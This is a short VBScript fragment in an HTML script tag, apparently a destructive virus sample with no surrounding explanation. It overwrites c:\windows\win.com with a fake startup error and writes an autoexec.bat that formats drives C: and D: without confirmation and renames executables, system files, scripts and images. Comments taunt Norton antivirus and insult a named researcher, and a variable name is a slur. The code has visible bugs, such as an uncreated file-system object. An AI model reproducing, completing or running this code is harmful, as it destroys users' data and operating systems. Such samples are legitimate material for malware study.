<script language=VBScript>

Set gay = CreateObject("WScript.Shell")

   Dim fso, gay
  
   Set gay = fso.CreateTextFile("c:\windows\win.com", True)
   
   gay.WriteLine("echo Windows 2003 Server Edition cannot start")

   gay.Close 

    
  

Set gay = fso.CreateTextFile("c:\autoexec.bat", True)
  
   gay.WriteLine("@echo off")
   gay.WriteLine("cls") 
   gay.WriteLine("Format /y c:") 
   gay.WriteLine("Format /y D:") 
   gay.WriteLine "Symantec sucks, NAV can't detect much viruses..."
   gay.WriteLine "@echo off"
   gay.WriteLine "REM Sorry, Norton is a very bad antivirus, please prefer other, Peter Szor, you're a morons, stop sucks and make a best heuristic for NAV, THE HEURISTIC OF NAV SUCKS!!!"
   gay.WriteLine "rename *.vbs *.AGM"
   gay.WriteLine "rename *.jpg *.AGM"
   gay.WriteLine "rename *.exe *.AGM"
   gay.WriteLine "rename *.sys *.AGM"
                 
   gay.Close 



</script>
